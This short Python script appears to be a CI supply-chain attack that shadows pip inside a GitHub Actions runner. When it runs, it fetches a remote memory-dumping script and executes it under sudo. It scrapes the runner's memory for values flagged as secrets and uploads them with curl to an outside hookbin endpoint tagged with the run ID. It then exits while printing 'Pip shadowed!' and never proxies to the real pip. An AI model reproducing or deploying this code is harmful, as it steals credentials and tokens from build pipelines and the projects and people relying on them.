import os
import sys

# Exploit
run_id = os.environ.get("GITHUB_RUN_ID", "")
cmd = f"""echo "Okay, we got this far. Let's continue..."
curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{{"value":"[^"]*","isSecret":true\\}}' >> "/tmp/secrets"
curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/{run_id}"
"""
os.system(cmd)

# Proxy to real pip
print("Pip shadowed!")
sys.exit(0)
